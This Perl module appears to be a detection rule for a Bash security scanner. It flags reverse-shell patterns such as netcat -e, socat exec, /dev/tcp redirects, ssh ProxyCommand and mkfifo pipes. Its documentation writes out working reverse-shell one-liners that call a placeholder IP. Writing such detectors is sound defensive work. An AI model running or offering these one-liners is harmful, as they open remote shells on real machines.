package Text::Treesitter::Bash::Security::Rule::ReverseShellSink;
# ABSTRACT: Detect common reverse-shell command patterns
our $VERSION = '0.002';
use strict;
use warnings;
use parent 'Text::Treesitter::Bash::Security::Rule';

=encoding utf8

=head1 NAME

Text::Treesitter::Bash::Security::Rule::ReverseShellSink - detect classic reverse-shell constructions

=head1 DESCRIPTION

Matches argv / source text against the canonical reverse-shell
recipes. All matches are C<high>.

=over 4

=item C<nc -e> / C<nc -c> — C<netcat> executing a shell on connection.

=item C<ncat -e> — same, ncat variant.

=item C<socat exec:'/bin/bash',stderr ...> — socat as a one-liner reverse shell.

=item C<bash -i> / C<sh -i> with stdout/stderr redirected to /dev/tcp — bash TCP redirect trick.

=item C<ssh -o ProxyCommand=...> — abused as a proxy.

=item C<mkfifo /tmp/x; cat /tmp/x | sh -i ...> — named-pipe + shell pattern.

=back

=head1 EXAMPLES

    nc -e /bin/sh 10.0.0.1 4444                                  -> high
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:...  -> high
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1                       -> high
    ssh -o ProxyCommand="nc %h %p" user@host                     -> high

=head1 SEE ALSO

L<Text::Treesitter::Bash::Security::Rule>.

=cut

sub check {
  my ( $class, $command ) = @_;

  my $name = $command->{command} // '';
  my $argv = $command->{argv} // [];
  my $source = $command->{source} // '';

  my $basename = $name;
  $basename =~ s{.*/}{};

  # nc / ncat with -e or -c
  if ( $basename eq 'nc' || $basename eq 'ncat' || $basename eq 'netcat' ) {
    for my $arg (@$argv) {
      next if ref $arg;
      if ( $arg eq '-e' || $arg eq '-c' ) {
        return {
          rule     => 'ReverseShellSink',
          severity => 'high',
          message  => "Reverse-shell sink: $basename with $arg",
          command  => $name,
          arg      => $arg,
        };
      }
    }
  }

  # socat exec:'...'
  if ( $basename eq 'socat' && $source =~ m{\bexec:} ) {
    return {
      rule     => 'ReverseShellSink',
      severity => 'high',
      message  => "Reverse-shell sink: socat exec: redirect",
      command  => $name,
      source   => $source,
    };
  }

  # bash -i / sh -i with /dev/tcp redirect
  if ( ( $basename eq 'bash' || $basename eq 'sh' || $basename eq 'zsh' )
    && $source =~ m{/dev/tcp/} )
  {
    return {
      rule     => 'ReverseShellSink',
      severity => 'high',
      message  => "Reverse-shell sink: $basename -i with /dev/tcp redirect",
      command  => $name,
      source   => $source,
    };
  }

  # ssh with ProxyCommand (often abused as a proxy)
  if ( $basename eq 'ssh' && $source =~ m{ProxyCommand=} ) {
    return {
      rule     => 'ReverseShellSink',
      severity => 'medium',
      message  => "ssh with ProxyCommand — possible proxy/tunnel",
      command  => $name,
      source   => $source,
    };
  }

  # mkfifo + cat + shell pattern
  if ( $basename eq 'mkfifo' ) {
    return {
      rule     => 'ReverseShellSink',
      severity => 'medium',
      message  => "mkfifo used to set up a reverse shell pipe",
      command  => $name,
      source   => $source,
    };
  }

  return;
}

1;
